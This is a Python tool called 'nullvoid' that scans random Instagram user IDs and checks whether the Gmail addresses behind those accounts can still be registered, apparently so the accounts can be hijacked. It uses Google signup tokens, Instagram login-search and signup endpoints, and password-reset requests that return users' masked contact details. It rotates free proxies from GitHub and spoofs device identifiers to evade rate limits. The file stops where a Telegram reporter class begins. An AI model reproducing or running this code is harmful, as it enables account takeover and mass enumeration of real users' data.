#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
nullvoid — RDP build, fast, auto-proxy from GitHub.
Dependencies:
    pip install requests "requests[socks]" "httpx[http2]" user_agent
"""

import os, sys, re, json, time, uuid, base64, secrets, random, signal, string, traceback
import threading
from datetime import datetime, timezone
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
import httpx
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from user_agent import generate_user_agent

requests.packages.urllib3.disable_warnings()

# ── config ────────────────────────────────────────────────────────────────────
MIN_FOLLOWERS    = 0
THREADS_START    = 100
USER_ID_MIN      = 2500000000
USER_ID_MAX      = 21254029834
TL_FILE          = "tl.txt"
HITS_FILE        = "hits.txt"
ERR_FILE         = "errors.log"
STATUS_FILE      = "status.txt"
TELEGRAM_TIMEOUT = 12
IG_TIMEOUT       = 8        # faster timeout for proxy path
GOOGLE_TIMEOUT   = 10
BRAND            = "NULLVOID"

IG_JITTER_MIN    = 0.1      # was 1.2 — free proxy adds latency already
IG_JITTER_MAX    = 0.3
STATUS_EVERY_SEC = 5
STALL_SECONDS    = 60
ALT_CACHE_TTL    = 45
ALT_CACHE_MAX_REUSE = 8

# GitHub SOCKS5 sources
PROXY_SOURCES = [
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt",
    "https://raw.githubusercontent.com/proxy-free/free-proxy-list/main/socks5.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
    "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt",
]
PROXY_TEST_URL       = "https://api.ipify.org?format=json"
PROXY_TEST_TIMEOUT   = 4
PROXY_TEST_WORKERS   = 60
PROXY_MAX_KEEP       = 200
PROXY_REFRESH_EVERY  = 900     # 15 min
PROXY_SAMPLE_SIZE    = 400     # test up to 400 raw proxies at startup
# ─────────────────────────────────────────────────────────────────────────────

IS_WINDOWS = os.name == "nt"
IS_TTY = sys.stdout.isatty()

try:
    if IS_WINDOWS:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace", line_buffering=True)
    else:
        sys.stdout.reconfigure(line_buffering=True)
except Exception:
    pass

class C:
    GOLD   = "\x1b[38;5;220m"
    WHITE  = "\x1b[38;5;255m"
    DIM    = "\x1b[38;5;240m"
    GREEN  = "\x1b[38;5;120m"
    RED    = "\x1b[38;5;196m"
    CYAN   = "\x1b[38;5;51m"
    PURPLE = "\x1b[1;38;5;135m"
    RESET  = "\x1b[0m"

if not IS_TTY:
    for _k in ("GOLD", "WHITE", "DIM", "GREEN", "RED", "CYAN", "PURPLE", "RESET"):
        setattr(C, _k, "")

def clear_screen():
    os.system("cls" if IS_WINDOWS else "clear")

APP_ID_GRAPHQL_PRIMARY = "936619743392459"
APP_ID_GRAPHQL_ALT     = "1217981644879628"
APP_ID_BLOKS           = "567067343352427"
APP_ID_WEB             = "936619743392459"
BLOKS_VERSION          = "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b"
BLOKS_VERSION_ID       = "f0fd53409d7667526e529854656fe20159af8b76db89f40c333e593b51a2ce10"
RUR_COOKIE             = ('"HIL\\0545636887483\\0541808136332:01fe43b89fcef61b8a466bfa81acf2b1'
                          'bbab08f406fc99b1da8b7d889fa68683a3364c43"')
DOC_IDS = ["26672929172408668", "38611279431804694", "9310670392322965"]

MOBILE_UAS = [
    "Mozilla/5.0 (Linux; Android 14; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7103.60 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
]
IG_UA_ANDROID = ("Instagram 320.0.0.34.109 Android (33/13; 420dpi; 1080x2340; "
                 "samsung; SM-A546B; a54x; exynos1380; en_US; 465123678)")
SEC_CH_UA_WIN = '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"'

# ── proxy pool ─────────────────────────────────────────────────────────────
class ProxyPool:
    def __init__(self):
        self._lock = threading.Lock()
        self._live = []
        self._dead = set()
        self._rr   = 0
        self._ready = threading.Event()

    def load(self):
        print(f"{C.DIM}  fetching SOCKS5 proxies from GitHub...{C.RESET}")
        raw = set()
        for url in PROXY_SOURCES:
            try:
                r = requests.get(url, timeout=12)
                if r.status_code == 200:
                    for line in r.text.splitlines():
                        line = line.strip()
                        if not line or line.startswith("#"):
                            continue
                        if re.match(r"^\d+\.\d+\.\d+\.\d+:\d+$", line):
                            raw.add(line)
                print(f"{C.DIM}    {url.split('/')[-1]}: total={len(raw)}{C.RESET}")
            except Exception as e:
                print(f"{C.DIM}    {url.split('/')[-1]}: {e!r}{C.RESET}")

        if not raw:
            print(f"{C.RED}  no proxies fetched — running direct{C.RESET}")
            self._ready.set()
            return

        sample = random.sample(list(raw), min(PROXY_SAMPLE_SIZE, len(raw)))
        print(f"{C.DIM}  testing {len(sample)} proxies ({PROXY_TEST_TIMEOUT}s each, {PROXY_TEST_WORKERS} workers)...{C.RESET}")
        live = []
        with ThreadPoolExecutor(max_workers=PROXY_TEST_WORKERS) as ex:
            futs = {ex.submit(self._test, p): p for p in sample}
            for fut in as_completed(futs):
                try:
                    ok = fut.result()
                except Exception:
                    ok = None
                if ok:
                    live.append(ok)
                    if len(live) >= PROXY_MAX_KEEP:
                        break

        with self._lock:
            self._live = live
        if live:
            print(f"{C.GREEN}  {len(live)} working proxies loaded{C.RESET}")
        else:
            print(f"{C.RED}  zero working proxies — running direct{C.RESET}")
        self._ready.set()

    @staticmethod
    def _test(hostport):
        proxy = f"socks5h://{hostport}"
        try:
            r = requests.get(
                PROXY_TEST_URL,
                proxies={"http": proxy, "https": proxy},
                timeout=PROXY_TEST_TIMEOUT,
                verify=False,
            )
            if r.status_code == 200:
                return proxy
        except Exception:
            pass
        return None

    def get(self):
        with self._lock:
            if not self._live:
                return None
            # skip dead in-place, round-robin over live
            for _ in range(len(self._live)):
                self._rr = (self._rr + 1) % len(self._live)
                p = self._live[self._rr]
                if p not in self._dead:
                    return p
            return None

    def kill(self, proxy):
        if not proxy:
            return
        with self._lock:
            self._dead.add(proxy)

    def count(self):
        with self._lock:
            return len([p for p in self._live if p not in self._dead])

POOL = ProxyPool()

def req_proxies():
    p = POOL.get()
    if not p:
        return None
    return {"http": p, "https": p}

def httpx_proxy():
    return POOL.get()

# ── sessions ────────────────────────────────────────────────────────────────
def fast_session():
    s = requests.Session()
    s.verify = False
    adapter = HTTPAdapter(
        pool_connections=40, pool_maxsize=40,
        max_retries=Retry(
            total=0,                    # no retries — dead proxy dies fast
            status_forcelist=(),
            raise_on_status=False,
        ),
    )
    s.mount("https://", adapter)
    s.mount("http://", adapter)
    return s

# ── stats ────────────────────────────────────────────────────────────────────
class Stats:
    def __init__(self):
        self.lock  = threading.Lock()
        self.good  = 0
        self.hits  = 0
        self.bad   = 0
        self.null  = 0
        self.err   = 0
        self.rl    = 0
        self.last  = time.time()
        self.start = time.time()

    def incr(self, field, n=1):
        with self.lock:
            setattr(self, field, getattr(self, field) + n)
            self.last = time.time()

    def touch(self):
        with self.lock:
            self.last = time.time()

    def snapshot(self):
        with self.lock:
            return (self.good, self.hits, self.bad, self.null, self.err, self.rl,
                    int(time.time() - self.start), int(time.time() - self.last))

STATS          = Stats()
UI_LOCK        = threading.Lock()
UI_ENABLED     = True
ERROR_LOG_LOCK = threading.Lock()
_last_display  = [0.0]
_last_stall    = [0.0]

def log_error(msg):
    with ERROR_LOG_LOCK:
        try:
            with open(ERR_FILE, "a", encoding="utf-8") as f:
                f.write(f"[{datetime.now(timezone.utc).isoformat()}] {msg}\n")
        except Exception:
            pass

def _fmt_full(g, h, b, n, e, r, up, idle):
    hh, mm, ss = up // 3600, (up % 3600) // 60, up % 60
    return (f"[{hh:02d}:{mm:02d}:{ss:02d} idle={idle:02d}s] "
            f"GOOD={g} HITS={h} BAD={b} NULL={n} ERR={e} 429={r} PX={POOL.count()}")

def display(force=False):
    global UI_ENABLED
    if not UI_ENABLED and not force:
        return
    g, h, b, n, e, r, up, idle = STATS.snapshot()

    if IS_TTY:
        hh, mm, ss = up // 3600, (up % 3600) // 60, up % 60
        line = (
            f"\r{C.PURPLE}{BRAND}{C.RESET} "
            f"{C.GOLD}GOOD:{C.GREEN}{g}{C.RESET} "
            f"{C.DIM}|{C.RESET} {C.GOLD}HITS:{C.WHITE}{h}{C.RESET} "
            f"{C.DIM}|{C.RESET} {C.GOLD}BAD:{C.RED}{b}{C.RESET} "
            f"{C.DIM}|{C.RESET} {C.GOLD}PX:{C.WHITE}{POOL.count()}{C.RESET} "
            f"{C.DIM}|{C.RESET} {C.DIM}{hh:02d}:{mm:02d}:{ss:02d}{C.RESET}   "
        )
        with UI_LOCK:
            sys.stdout.write(line)
            sys.stdout.flush()
    else:
        now = time.time()
        if not force and now - _last_display[0] < STATUS_EVERY_SEC:
            return
        _last_display[0] = now
        clean = f"{BRAND} GOOD:{g} | HITS:{h} | BAD:{b} | PX:{POOL.count()}"
        full  = _fmt_full(g, h, b, n, e, r, up, idle)
        with UI_LOCK:
            print(clean, flush=True)
            try:
                with open(STATUS_FILE, "w", encoding="utf-8") as f:
                    f.write(clean + "\n" + full + "\n")
            except Exception:
                pass

def status_thread():
    while True:
        time.sleep(STATUS_EVERY_SEC)
        display()

def stall_watchdog():
    while True:
        time.sleep(15)
        g, h, b, n, e, r, up, idle = STATS.snapshot()
        if idle >= STALL_SECONDS and time.time() - _last_stall[0] >= STALL_SECONDS:
            _last_stall[0] = time.time()
            log_error(f"stall: idle={idle}s "
                      f"GOOD={g} HITS={h} BAD={b} NULL={n} ERR={e} 429={r}")

def proxy_refresh_loop():
    while True:
        time.sleep(PROXY_REFRESH_EVERY)
        try:
            POOL.load()
        except Exception as e:
            log_error(f"proxy refresh: {e!r}")

def emit_hit(text):
    global UI_ENABLED
    with UI_LOCK:
        UI_ENABLED = False
        if IS_TTY:
            sys.stdout.write("\r" + " " * 160 + "\r")
        print(text, flush=True)
        UI_ENABLED = True
    display(force=True)

def atomic_write(path, content):
    tmp = f"{path}.{os.getpid()}.{threading.get_ident()}.tmp"
    with open(tmp, "w", encoding="utf-8") as f:
        f.write(content)
    os.replace(tmp, path)

def atomic_read(path):
    with open(path, "r", encoding="utf-8") as f:
        return f.read().strip()

# ── Google ──────────────────────────────────────────────────────────────────
class GoogleChecker:
    CHARSET = "azertyuiopmlkjhgfdsqwxcvbn"

    def __init__(self):
        threading.Thread(target=self._token_loop, daemon=True).start()

    def _token_loop(self):
        while True:
            try:
                self._refresh_once()
            except Exception as e:
                STATS.incr("err")
                log_error(f"google token refresh: {e!r}")
            time.sleep(random.uniform(10, 20))

    def _refresh_once(self):
        rand = lambda a, b: "".join(random.choice(self.CHARSET) for _ in range(random.randrange(a, b)))
        n1, n2 = rand(6, 9), rand(3, 9)
        host = rand(15, 30)
        h1 = {
            "accept": "*/*",
            "accept-language": "ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6",
            "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
            "google-accounts-xsrf": "1",
            "sec-ch-ua": '"Not)A;Brand";v="24", "Chromium";v="116"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "user-agent": generate_user_agent(),
        }
        r1 = requests.get(
            "https://accounts.google.com/signin/v2/usernamerecovery"
            "?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB",
            headers=h1, timeout=GOOGLE_TIMEOUT, proxies=req_proxies(),
        )
        m = re.search(
            r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,'
            r'&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&',
            r1.text,
        )
        if m:
            tl = m.group(2)
            cookies = {"__Host-GAPS": host}
            h2 = {
                "authority": "accounts.google.com",
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
                "google-accounts-xsrf": "1",
                "origin": "https://accounts.google.com",
                "referer": "https://accounts.google.com/signup/v2/createaccount",
                "user-agent": generate_user_agent(),
            }
            data = {
                "f.req": f'["{tl}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
                "deviceinfo": '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]',
            }
            r2 = requests.post(
                "https://accounts.google.com/_/signup/validatepersonaldetails",
                cookies=cookies, headers=h2, data=data, timeout=GOOGLE_TIMEOUT,
                proxies=req_proxies(),
            )
            if '",null,"' in r2.text:
                tl = r2.text.split('",null,"')[1].split('"')[0]
            host = r2.cookies.get("__Host-GAPS", host)
            atomic_write(TL_FILE, f"{tl}//{host}\n")
            return

        h3 = {
            "accept": "*/*",
            "accept-language": "en",
            "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
            "origin": "https://accounts.google.com",
            "referer": "https://accounts.google.com/",
            "user-agent": generate_user_agent(),
            "x-goog-ext-278367001-jspb": '["GlifWebSignIn"]',
            "x-same-domain": "1",
            "sec-ch-ua": SEC_CH_UA_WIN,
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
        }
        params = {"rpcids": "NHJMOd", "source-path": "/lifecycle/steps/signup/username", "hl": "en"}
        fake = "".join(random.choices("abcdefghijklmnopqrstuvwxyz1234567890.", k=random.randint(16, 26)))
        body = (
            "f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22"
            + fake
            + "%5C%22%2C0%2C0%2C1%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C1%2C17359%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D"
        )
        r3 = requests.post(
            "https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute",
            params=params, headers=h3, data=body, timeout=GOOGLE_TIMEOUT,
            proxies=req_proxies(),
        )
        m2 = re.search(r'"TL:([^"]+)"', r3.text)
        if m2:
            tl = m2.group(1)
            host = "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=random.randint(15, 30)))
            atomic_write(TL_FILE, f"{tl}//{host}\n")

    def _load_token(self):
        for _ in range(20):
            try:
                line = atomic_read(TL_FILE)
                if "//" in line:
                    tl, host = line.split("//", 1)
                    if tl and host:
                        return tl, host
            except Exception:
                pass
            time.sleep(0.3)
        return None, None

    def check(self, email, _attempt=0):
        local = email.split("@")[0] if "@" in email else email
        tl, host = self._load_token()
        if not tl:
            return "bad"
        cookies = {"__Host-GAPS": host}
        headers = {
            "authority": "accounts.google.com",
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
            "google-accounts-xsrf": "1",
            "origin": "https://accounts.google.com",
            "referer": f"https://accounts.google.com/signup/v2/createusername?TL={tl}",
            "user-agent": generate_user_agent(),
        }
        params = {"TL": tl}
        body = (
            "continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp"
            "&service=mail&theme=mn"
            f"&f.req=%5B%22TL%3A{tl}%22%2C%22{local}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D"
            "&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false"
            "&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull"
            "%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull"
            "%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D"
            "&gmscoreversion=undefined&flowName=GlifWebSignIn&"
        )
        try:
            r = requests.post(
                "https://accounts.google.com/_/signup/usernameavailability",
                params=params, cookies=cookies, headers=headers, data=body,
                timeout=GOOGLE_TIMEOUT, proxies=req_proxies(),
            )
        except Exception as e:
            log_error(f"google check: {e!r}")
            return "bad"
        if '"gf.uar",1' in r.text:
            return "good"
        if '"er",null,null,null,null,400' in r.text and _attempt < 1:
            time.sleep(0.3)
            return self.check(email, _attempt + 1)
        return "bad"

# ── bootstrap ───────────────────────────────────────────────────────────────
_bootstrap_lock  = threading.Lock()
_bootstrap_lsd   = None
_bootstrap_csrf  = None
_bootstrap_mid   = None
_bootstrap_at    = 0.0

def bootstrap_ig():
    global _bootstrap_lsd, _bootstrap_csrf, _bootstrap_mid, _bootstrap_at
    with _bootstrap_lock:
        if _bootstrap_lsd and _bootstrap_csrf and (time.time() - _bootstrap_at) < 120:
            return True
    try:
        s = fast_session()
        headers = {
            "User-Agent": random.choice(MOBILE_UAS),
            "x-ig-app-id": APP_ID_WEB,
            "x-bloks-version-id": BLOKS_VERSION_ID,
            "origin": "https://www.instagram.com",
            "referer": "https://www.instagram.com/",
        }
        r = s.get("https://www.instagram.com/", headers=headers, timeout=12, proxies=req_proxies())
        if r.status_code == 200:
            m = re.search(r'"LSD",\[\],\{"token":"([^"]+)"', r.text)
            lsd = m.group(1) if m else None
            csrf = r.cookies.get("csrftoken", "")
            mid = r.cookies.get("mid", base64.urlsafe_b64encode(secrets.token_bytes(18)).decode().rstrip("="))
            if csrf and lsd:
                with _bootstrap_lock:
                    _bootstrap_lsd  = lsd
                    _bootstrap_csrf = csrf
                    _bootstrap_mid  = mid
                    _bootstrap_at   = time.time()
                s.close()
                return True
        s.close()
    except Exception as e:
        log_error(f"bootstrap ig: {e!r}")
    return False

def bootstrap_refresh_loop():
    while True:
        try:
            bootstrap_ig()
        except Exception:
            pass
        time.sleep(random.uniform(90, 150))

threading.Thread(target=bootstrap_refresh_loop, daemon=True).start()

# ── alt cache ──────────────────────────────────────────────────────────────
_tl = threading.local()

def _alt_cache_get():
    if not hasattr(_tl, "alt") or _tl.alt is None:
        return None
    if time.time() - _tl.alt["at"] > ALT_CACHE_TTL:
        return None
    if _tl.alt["uses"] >= ALT_CACHE_MAX_REUSE:
        return None
    return _tl.alt

def _alt_cache_set_ok():
    _tl.alt = {"at": time.time(), "uses": 0}

def _alt_cache_use():
    if hasattr(_tl, "alt") and _tl.alt:
        _tl.alt["uses"] += 1

def _alt_cache_clear():
    _tl.alt = None

# ── Instagram ──────────────────────────────────────────────────────────────
class InstagramChecker:
    def __init__(self):
        self._session = fast_session()

    def _graphql_alt(self, user_id):
        with _bootstrap_lock:
            lsd, csrf, mid = _bootstrap_lsd, _bootstrap_csrf, _bootstrap_mid
        if not lsd or not csrf:
            return None
        headers = {
            "User-Agent": random.choice(MOBILE_UAS),
            "Content-Type": "application/x-www-form-urlencoded",
            "x-csrftoken": csrf,
            "x-fb-friendly-name": "PolarisProfilePageContentQuery",
            "x-ig-app-id": APP_ID_GRAPHQL_ALT,
            "x-bloks-version-id": BLOKS_VERSION_ID,
            "x-asbd-id": str(random.randint(120000, 400000)),
            "x-fb-lsd": lsd,
            "origin": "https://www.instagram.com",
            "referer": "https://www.instagram.com/",
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "sec-ch-ua": SEC_CH_UA_WIN,
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "accept-language": "en-US",
            "priority": "u=1, i",
        }
        if mid:
            headers["x-mid"] = mid
        payload = {
            "jazoest": "2" + "".join(random.choices(string.digits, k=4)),
            "lsd": lsd,
            "__crn": "comet.igweb.PolarisExploreSearchRoute",
            "fb_api_caller_class": "RelayModern",
            "fb_api_req_friendly_name": "PolarisProfilePageContentQuery",
            "server_timestamps": "true",
            "variables": json.dumps({
                "enable_integrity_filters": True,
                "id": str(user_id),
                "__relay_internal__pv__PolarisCannesGuardianExperienceEnabledrelayprovider": True,
                "__relay_internal__pv__PolarisCASB976ProfileEnabledrelayprovider": False,
                "__relay_internal__pv__PolarisWebSchoolsEnabledrelayprovider": False,
                "__relay_internal__pv__PolarisRepostsConsumptionEnabledrelayprovider": True,
                "__relay_internal__pv__PolarisShortDramaEnabledrelayprovider": False,
                "__relay_internal__pv__PolarisLongformEnabledrelayprovider": False,
            }, separators=(",", ":")),
            "doc_id": random.choice(DOC_IDS),
        }
        cookies = {"csrftoken": csrf}
        proxy_used = POOL.get()
        try:
            r = self._session.post(
                "https://www.instagram.com/api/graphql",
                data=payload, headers=headers, cookies=cookies,
                timeout=IG_TIMEOUT, proxies={"http": proxy_used, "https": proxy_used} if proxy_used else None,
            )
            if r.status_code == 429:
                STATS.incr("rl")
                POOL.kill(proxy_used)
                return None
            if r.status_code == 200:
                try:
                    j = r.json()
                except Exception:
                    return None
                u = j.get("data", {}).get("user")
                if u and u.get("username"):
                    return u
        except Exception:
            POOL.kill(proxy_used)
        return None

    def _graphql_samgod(self, user_id):
        with _bootstrap_lock:
            lsd, csrf = _bootstrap_lsd, _bootstrap_csrf
        if not lsd or not csrf:
            return None
        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded",
            "x-bloks-version-id": BLOKS_VERSION_ID,
            "x-ig-app-id": APP_ID_GRAPHQL_PRIMARY,
            "x-fb-lsd": lsd,
            "x-csrftoken": csrf,
            "x-fb-friendly-name": "PolarisProfilePageContentQuery",
            "sec-ch-ua-platform": '"Android"',
            "origin": "https://www.instagram.com",
            "sec-fetch-site": "same-origin",
        }
        cookies = {"rur": RUR_COOKIE}
        variables = {
            "enable_integrity_filters": True,
            "id": str(user_id),
            "__relay_internal__pv__PolarisCannesGuardianExperienceEnabledrelayprovider": True,
            "__relay_internal__pv__PolarisCASB976ProfileEnabledrelayprovider": False,
            "__relay_internal__pv__PolarisWebSchoolsEnabledrelayprovider": False,
            "__relay_internal__pv__PolarisRepostsConsumptionEnabledrelayprovider": False,
        }
        payload = {
            "lsd": lsd,
            "fb_api_caller_class": "RelayModern",
            "fb_api_req_friendly_name": "PolarisProfilePageContentQuery",
            "variables": json.dumps(variables),
            "server_timestamps": "true",
            "doc_id": DOC_IDS[0],
        }
        proxy_used = POOL.get()
        try:
            r = self._session.post(
                "https://www.instagram.com/api/graphql",
                headers=headers, data=payload, cookies=cookies,
                timeout=IG_TIMEOUT, proxies={"http": proxy_used, "https": proxy_used} if proxy_used else None,
            )
            if r.status_code == 429:
                STATS.incr("rl")
                POOL.kill(proxy_used)
                return None
            if r.status_code == 200:
                try:
                    j = r.json()
                except Exception:
                    return None
                u = j.get("data", {}).get("user")
                if u and u.get("username"):
                    return u
        except Exception:
            POOL.kill(proxy_used)
        return None

    def get_user_data(self, user_id):
        if _alt_cache_get():
            _alt_cache_use()
            return self._graphql_samgod(user_id)
        u = self._graphql_alt(user_id)
        if u:
            _alt_cache_set_ok()
            return u
        _alt_cache_clear()
        return self._graphql_samgod(user_id)

    def _check_bloks(self, email):
        device = "android-" + "".join(random.choices("abcdef0123456789", k=16))
        family = str(uuid.uuid4())
        android = "android-" + "".join(random.choices("abcdef0123456789", k=16))
        waterfall = str(uuid.uuid4())
        aac = (
            '{"client_input_params":{"aac":"{\\"aac_init_timestamp\\":'
            + str(int(time.time()))
            + ',\\"aacjid\\":\\"' + str(uuid.uuid4()) + '\\",\\"aaccs\\":\\"'
            + secrets.token_urlsafe(32)
            + '\\"}","flash_call_permissions_status":'
            '{"READ_PHONE_STATE":"PERMANENTLY_DENIED","READ_CALL_LOG":"DENIED",'
            '"ANSWER_PHONE_CALLS":"DENIED"},"was_headers_prefill_available":0,'
            '"network_bssid":null,"sfdid":"","fetched_email_token_list":{},'
            '"search_query":"' + email + '","auth_secure_device_id":"",'
            '"ig_oauth_token":[],"cloud_trust_token":null,"was_headers_prefill_used":0,'
            '"sso_accounts_auth_data":[],"encrypted_msisdn":"","device_network_info":null,'
            '"text_input_id":"akyuf0:61","zero_balance_state":null,"android_build_type":"release",'
            '"accounts_list":[],"is_oauth_without_permission":0,"ig_android_qe_device_id":"'
            + device + '","gms_incoming_call_retriever_eligibility":"client_not_supported",'
            '"search_screen_type":"email_or_username","is_whatsapp_installed":1,'
            '"lois_settings":{"lois_token":""},"ig_vetted_device_nonce":null,'
            '"headers_infra_flow_id":"","fetched_email_list":[]},"server_params":'
            '{"event_request_id":"' + str(uuid.uuid4()) + '","is_from_logged_out":0,'
            '"layered_homepage_experiment_group":null,"device_id":"' + device + '",'
            '"login_surface":"login_home","waterfall_id":"' + waterfall + '",'
            '"INTERNAL__latency_qpl_instance_id":6.3987980400102E13,"is_platform_login":0,'
            '"context_data":"","login_entry_point":"logged_out",'
            '"INTERNAL__latency_qpl_marker_id":36707139,"family_device_id":"' + family + '",'
            '"offline_experiment_group":"caa_iteration_v3_perf_ig_4",'
            '"access_flow_version":"pre_mt_behavior","is_from_logged_in_switcher":0,'
            '"qe_device_id":"' + device + '"}}'
        )
        payload = {
            "params": aac,
            "bk_client_context": '{"bloks_version":"' + BLOKS_VERSION + '","styles_id":"instagram"}',
            "bloks_versioning_id": BLOKS_VERSION,
        }
        headers = {
            "User-Agent": IG_UA_ANDROID,
            "accept-language": "en-IN, en-US",
            "x-bloks-version-id": BLOKS_VERSION,
            "x-fb-friendly-name": "IgApi: bloks/async_action/com.bloks.www.caa.ar.search.async/",
            "x-ig-android-id": android,
            "x-ig-app-id": APP_ID_BLOKS,
            "x-ig-app-locale": "en_IN",
            "x-ig-client-endpoint": "com.bloks.www.caa.ar.search",
            "x-ig-device-id": device,
            "x-ig-family-device-id": family,
            "x-ig-timezone-offset": str(int(datetime.now().astimezone().utcoffset().total_seconds())),
            "x-mid": base64.urlsafe_b64encode(secrets.token_bytes(18)).decode().rstrip("="),
            "x-pigeon-rawclienttime": str(time.time()),
            "x-pigeon-session-id": f"UFS-{uuid.uuid4()}-0",
            "sec-ch-ua": SEC_CH_UA_WIN,
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
        }
        proxy_used = POOL.get()
        try:
            r = self._session.post(
                "https://i.instagram.com/api/v1/bloks/async_action/com.bloks.www.caa.ar.search.async/",
                data=payload, headers=headers, timeout=IG_TIMEOUT,
                proxies={"http": proxy_used, "https": proxy_used} if proxy_used else None,
            )
            if r.status_code == 429:
                STATS.incr("rl")
                POOL.kill(proxy_used)
                return False
            return email in r.text
        except Exception:
            POOL.kill(proxy_used)
            return False

    def _check_web_create(self, email):
        with _bootstrap_lock:
            csrf = _bootstrap_csrf
        if not csrf:
            return False
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded",
            "x-csrftoken": csrf,
            "x-ig-app-id": APP_ID_WEB,
            "origin": "https://www.instagram.com",
            "referer": "https://www.instagram.com/accounts/emailsignup/",
        }
        cookies = {"csrftoken": csrf}
        data = {
            "email": email,
            "username": "testuser_" + str(random.randint(1000, 99999)),
            "first_name": "Test",
            "password": "Test@123456",
        }
        proxy_used = POOL.get()
        try:
            r = self._session.post(
                "https://www.instagram.com/api/v1/web/accounts/web_create_ajax/attempt/",
                headers=headers, cookies=cookies, data=data,
                timeout=IG_TIMEOUT,
                proxies={"http": proxy_used, "https": proxy_used} if proxy_used else None,
            )
            if r.status_code == 429:
                STATS.incr("rl")
                POOL.kill(proxy_used)
                return False
            if r.status_code == 200:
                return "email" in r.json().get("errors", {})
            return False
        except Exception:
            POOL.kill(proxy_used)
            return False

    def check_email(self, email):
        try:
            if self._check_bloks(email):
                return True
            return self._check_web_create(email)
        except Exception as e:
            STATS.incr("err")
            log_error(f"ig check_email: {e!r}")
            return False

# ── reset ─────────────────────────────────────────────────────────────────
RECOVERY_EMAIL_RE = re.compile(r'[a-zA-Z0-9\*\._%+-]+@[a-zA-Z0-9\.-]+\.[a-zA-Z]{2,}')

class ResetFetcher:
    def __init__(self):
        self._client = None
        try:
            self._client = httpx.Client(
                http2=True, verify=False,
                headers={
                    "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
                                  "(KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
                    "x-ig-app-id": "936619743392459",
                    "x-requested-with": "XMLHttpRequest",
                    "origin": "https://www.instagram.com",
                    "referer": "https://www.instagram.com/accounts/password/reset/",
                },
                timeout=10,
            )
        except Exception as e:
            log_error(f"reset fetcher init: {e!r}")
            self._client = None

    def fetch(self, username):
        if self._client is None:
            return "-"
        try:
            r = self._client.post(
                "https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/",
                data={"email_or_username": username, "flow": "fxcal"},
                proxy=httpx_proxy(),
            )
            if r.status_code != 200:
                return "-"
            d = r.json()
            if d.get("status") != "ok":
                return "-"
            for k in ("obfuscated_email", "contact_point", "obfuscated_phone"):
                v = d.get(k)
                if v:
                    return v
            m = RECOVERY_EMAIL_RE.search(r.text)
            if m:
                return m.group(0)
            if d.get("email_sent"):
                return "(masked)"
            return "-"
        except Exception:
            return "-"

# ── Telegram ──────────────────────────────────────────────────────────────
class Reporter:
    def __init__(self, token, chat_id):
